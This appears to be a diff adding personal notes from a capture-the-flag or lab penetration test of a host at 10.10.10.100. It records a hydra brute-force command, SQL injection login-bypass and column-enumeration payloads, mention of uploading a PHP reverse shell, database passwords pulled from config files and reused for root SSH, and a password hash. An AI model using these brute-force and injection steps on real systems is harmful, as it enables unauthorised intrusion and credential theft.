@@ -1,0 +1,88 @@
+======================================================
+===============GENERIC================================
+======================================================
+
+I saw that there is a user called admin@isints.com
+
+
+======================================================
+===============hydra bruteforce=======================
+======================================================
+running the command:
+	hydra -l admin@isints -P /usr/share/wordlists/rockyou.txt 10.10.10.100 http-post-form "/login.php:email=^USER^&pass=^PASS^&submit=Login&submitted=TRUE:our browser must allow cookies in order to log in." -o hydra.log
+didn't return enything usefull :(
+
+======================================================
+===============SQLi===================================
+======================================================
+trying this SQLI on the login.php form:
+	
+	email: tomer' or 1=1;
+	password: <empty>
+	
+says that we need to enter a password.
+trying this one:
+	
+	email: tomer' or 1=1;
+	password: bla
+
+we get that the 'LOGIN' query on the server looks like this:
+
+	SELECT *
+	  FROM users
+	 WHERE email = '{email}'
+	   AND pass = '{password}'
+	   AND active IS NULL
+	   
+using these creds we are able to log in as admin!!
+	email: tomer' or 1=1#
+	password: bla
+	
+to check how many columns there are in table "users", we sort by column number. we can see that there are 8 columns:
+	email: tomer' or 1=1 order by 8#
+	password: bla
+	
+===============UPLOAD REVERSE SHELL!===============
+uploaded a reverse shell using the SQL query in the file "php-reverse-shell.php":
+
+
+======================================================
+===============MYSQL CONNECTION USERS=================
+======================================================
+got password from /var/www/mysql_connect.php:
+DEFINE ('DB_USER', 'root');
+DEFINE ('DB_PASSWORD', 'goodday');
+trying this as ssh password didnt work for any of the users :(
+
+
+======================================================
+===========MYSQL CONNECTION USERS - ROOT!!============
+======================================================
+got password from /var/mysql_connect.php:
+DEFINE ('DB_USER', 'root');
+DEFINE ('DB_PASSWORD', 'root@ISIntS');
+trying this as ssh on root worked!
+
+
+
+
+
+
+======================================================
+===============EXTRAS=================================
+======================================================
+
+~~~~~~~~~~~~~~~SQLi register bruteforce~~~~~~~~~~~~~~~
+tried to register lots of users with burps intruder and then inject a query to return the user
+with the sama hash as admin.
+finished the php SQLi before and stopped the attack (was very slow and added many users anyway)
+	
+~~~~~~~~~~~~~~~Crack root password with john and hashcat~~~~~~~~~~~~~~~
+got the hash from /var/www/blog/config/password.txt: $1$weWj5iAZ$NU4CkeZ9jNtcP/qrPC69a/
+running john for almost 2 days didnt crack it :(
+	
+	
+	
+	
+	
+	
